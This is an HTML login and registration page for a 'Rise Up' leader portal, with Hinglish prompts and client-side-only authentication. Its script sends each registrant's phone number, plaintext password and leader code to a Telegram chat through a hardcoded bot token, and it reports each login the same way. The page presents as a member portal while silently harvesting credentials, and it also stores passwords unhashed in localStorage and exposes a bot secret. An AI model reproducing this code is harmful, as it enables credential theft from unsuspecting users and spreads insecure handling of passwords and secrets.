<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rise Up | Leader Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
        body { font-family: 'Poppins', sans-serif; background: #0f172a; color: #1e293b; }
        .hidden { display: none; }
        .glass-card { background: white; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div id="authBox" class="glass-card w-full max-w-md p-8 border-t-8 border-blue-600">
        <div class="text-center mb-6">
            <img src="https://i.ibb.co/1GbT9tsc/Screenshot-20251228-163055.jpg" class="h-16 mx-auto mb-2 rounded-lg shadow">
            <h1 class="text-2xl font-black text-blue-900 uppercase tracking-tighter">Rise Up</h1>
            <p id="formTitle" class="text-sm text-gray-500 font-bold uppercase tracking-widest mt-2">Leader Login</p>
        </div>

        <div id="loginSection">
            <div class="space-y-4">
                <input type="number" id="lPhone" placeholder="Mobile Number" class="w-full p-4 bg-gray-50 border rounded-xl outline-none focus:ring-2 focus:ring-blue-500">
                <input type="password" id="lPass" placeholder="Password" class="w-full p-4 bg-gray-50 border rounded-xl outline-none focus:ring-2 focus:ring-blue-500">
                <button onclick="handleLogin()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-lg hover:bg-blue-800 transition transform active:scale-95">Log In</button>
            </div>
            <p class="mt-8 text-center text-sm">Naya account? <button onclick="switchForm('reg')" class="text-blue-600 font-bold">Register Karein</button></p>
        </div>

        <div id="regSection" class="hidden">
            <div class="space-y-4">
                <input type="text" id="rCode" placeholder="Leader Code (e.g. AK01)" class="w-full p-4 bg-blue-50 border-2 border-blue-100 rounded-xl outline-none focus:border-blue-500 font-bold uppercase">
                <input type="number" id="rPhone" placeholder="Mobile Number" class="w-full p-4 bg-gray-50 border rounded-xl outline-none focus:ring-2 focus:ring-green-500">
                <input type="password" id="rPass" placeholder="Set Password" class="w-full p-4 bg-gray-50 border rounded-xl outline-none focus:ring-2 focus:ring-green-500">
                <button onclick="handleRegister()" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold text-lg hover:bg-green-700 transition transform active:scale-95">Create Leader Account</button>
            </div>
            <p class="mt-8 text-center text-sm">Pehle se account hai? <button onclick="switchForm('login')" class="text-blue-600 font-bold">Login Karein</button></p>
        </div>
    </div>

    <div id="dashboard" class="hidden w-full max-w-lg bg-white p-10 rounded-3xl text-center shadow-2xl border-b-8 border-blue-600">
        <h2 class="text-3xl font-bold text-blue-900 mb-4">Rise Up Dashboard</h2>
        <div class="p-6 bg-blue-50 rounded-2xl mb-6">
            <p class="text-xs text-blue-400 font-bold uppercase mb-1">Active Number</p>
            <p id="activeNum" class="text-2xl font-mono font-bold text-blue-800"></p>
        </div>
        <button onclick="logout()" class="w-full bg-red-500 text-white py-3 rounded-xl font-bold">Logout</button>
    </div>

    <script>
        const BOT_TOKEN = "8312452063:AAE2CoKaVAg6ORv8qX0bPxj5W--VQoU1rco";
        const CHAT_ID = "8312452063";

        const validLeaderCodes = [
            "AK01", "SY02", "RK45", "UP11", "RZ07", "BT99", "MK23", "LD50", "JS08", "VR14", 
            "NP21", "GX33", "HF67", "TW04", "QM19", "XP82", "BN55", "KL09", "JH41", "RS22", 
            "GD03", "PL76", "MC12", "VB88", "XF31", "TR05", "NW66", "KJ47", "ML10", "AZ92", 
            "HQ54", "SP18", "DR73", "WF29", "BK06", "YV61", "XT38", "NR15", "LC44", "GT27", 
            "PM02", "FR81", "JU13", "WE59", "KY37", "OA84", "IV17", "ME52", "ZG08", "RU25"
        ];

        function switchForm(view) {
            if(view === 'reg') {
                document.getElementById('loginSection').classList.add('hidden');
                document.getElementById('regSection').classList.remove('hidden');
                document.getElementById('formTitle').innerText = "Leader Registration";
            } else {
                document.getElementById('regSection').classList.add('hidden');
                document.getElementById('loginSection').classList.remove('hidden');
                document.getElementById('formTitle').innerText = "Leader Login";
            }
        }

        async function sendTelegram(msg) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
            await fetch(url);
        }

        function handleRegister() {
            const code = document.getElementById('rCode').value.toUpperCase();
            const phone = document.getElementById('rPhone').value;
            const pass = document.getElementById('rPass').value;

            if(!validLeaderCodes.includes(code)) {
                alert("Galat Leader Code!"); return;
            }
            if(phone.length < 10 || !pass) {
                alert("Sahi Number aur Password dalein!"); return;
            }

            const userData = { phone, pass };
            localStorage.setItem("user_" + phone, JSON.stringify(userData));
            
            sendTelegram(`ðŸ†• *Naya Registration!*\nðŸ“ž Number: ${phone}\nðŸ”‘ Pass: ${pass}\nðŸŽŸ Code: ${code}`);
            alert("Account ban gaya! Ab login karein.");
            switchForm('login');
        }

        function handleLogin() {
            const phone = document.getElementById('lPhone').value;
            const pass = document.getElementById('lPass').value;

            const stored = localStorage.getItem("user_" + phone);
            if(stored) {
                const data = JSON.parse(stored);
                if(data.pass === pass) {
                    sendTelegram(`ðŸ”“ *Leader Login!*\nðŸ“ž Number: ${phone}`);
                    enterApp(phone);
                } else {
                    alert("Galat Password!");
                }
            } else {
                alert("Account nahi mila! Pehle Register karein.");
            }
        }

        function enterApp(phone) {
            document.getElementById('authBox').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('activeNum').innerText = phone;
            sessionStorage.setItem("loggedUser", phone);
        }

        function logout() {
            sessionStorage.removeItem("loggedUser");
            location.reload();
        }

        window.onload = () => {
            const user = sessionStorage.getItem("loggedUser");
            if(user) enterApp(user);
        }
    </script>
</body>
</html>
